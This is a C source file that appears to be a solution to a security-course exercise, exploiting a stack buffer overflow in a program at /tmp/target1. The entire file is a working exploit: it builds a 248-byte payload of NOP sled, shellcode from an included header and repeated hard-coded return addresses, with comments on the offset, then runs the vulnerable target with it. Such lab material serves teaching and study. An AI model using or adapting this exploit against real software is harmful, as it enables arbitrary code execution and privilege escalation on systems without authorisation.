#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[1] = "hi there";
  args[2] = NULL;
  env[0] = NULL;

  // If we supply 248 bytes of input, we rewrite the return address completely
  // E.g. input "\x41" ("A") * 248 makes the return address 0x41414141
  int buff_size = 248; 

  char *buff; // The input we pass to break target1

  // Allocate 248 bytes for input, making sure there's enough memory
  if (!(buff = malloc(buff_size))) {
    fprintf(stderr, "Can't allocate memory.\n");
    exit(EXIT_FAILURE);
  }

  char *ret_address = "\xb0\xfc\xff\xbf"; // The new return address
  int shell_len = strlen(shellcode);
  int numRets = 20; // How many return addresses we put into the buffer
  int num_nops = buff_size - (shell_len + numRets * 4); // How many NOPs we put into our input
  int ret_start = num_nops + shell_len; // How many bytes occupied by NOP sled together with shellcode

  int i;

  // Add the NOPs to the inputs
  for (i = 0; i < num_nops; i++) {
    buff[i] = NOP;
  }

  // Follow by adding the shellcode
  for (i = num_nops; i < ret_start; i++) {
    buff[i] = shellcode[i-num_nops];
  }

  // Fill the rest with the new address
  for (i = ret_start; i < buff_size; i++) {
    buff[i] = ret_address[(i-ret_start) % 4];
  }

  args[1] = buff;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(buff);
  return 0;
}
